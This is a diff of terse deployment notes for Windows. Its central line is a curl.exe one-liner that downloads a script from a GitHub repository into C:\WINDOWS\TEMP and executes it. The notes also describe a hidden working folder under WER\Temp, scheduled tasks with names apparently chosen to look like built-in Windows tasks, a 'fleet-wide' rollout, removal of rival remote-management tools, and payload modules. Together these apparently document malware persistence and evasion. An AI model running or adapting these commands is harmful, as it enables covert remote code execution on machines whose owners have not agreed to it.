@@ -1,14 +1,12 @@
-UNIVERSAL DEPLOY (O32b — jsDelivr + build check):
+UNIVERSAL DEPLOY (O33 — IDENTVER=7 root-level tasks, CRLF):
 
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own.txt?t=o32c" & findstr /C:"OWN BUILD 20260802O32" C:\WINDOWS\TEMP\own.cmd >nul || curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/cf9625f/own.txt" & findstr /C:"OWN BUILD 20260802O32" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o33" & findstr /C:"OWN BUILD 20260802O33" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
-Must print: === OWN BUILD 20260802O32 ===
-If you see O30, raw CDN is stale — this oneliner uses jsDelivr first.
+Must print: === OWN BUILD 20260802O33 ===
 
-After ~90s:
-  cd /d C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache
-  findstr /C:"OWN_MON  BUILD" own_mon.cmd
-  findstr /C:"IDENTVER" identity.cfg
-  if exist own_mon.log (powershell -NoP -C "Get-Content own_mon.log -Tail 15")
+O33 fix: nested \Microsoft\Windows\* schtasks Create = Access Denied fleet-wide
+(verify_taskA-D_FAIL). Detach WucacheOwn worked (root-level). Now identity
+tasks are root names: \WerQueueSync \PlaServerHealth \WdiHostProxy etc.
 
-KEEP: dual SC + Datto | REMOVE: 51 RMMs | Fix: IDENTVER=6 task ownership + unique detach runner
+Expect TG: tasks 4/5 or 5/5, identity like \WerQueueSync (NOT \Microsoft\Windows\...)
+Payload: MON=M23 | SEC=S6 | TGR=T13 | LIB=L12
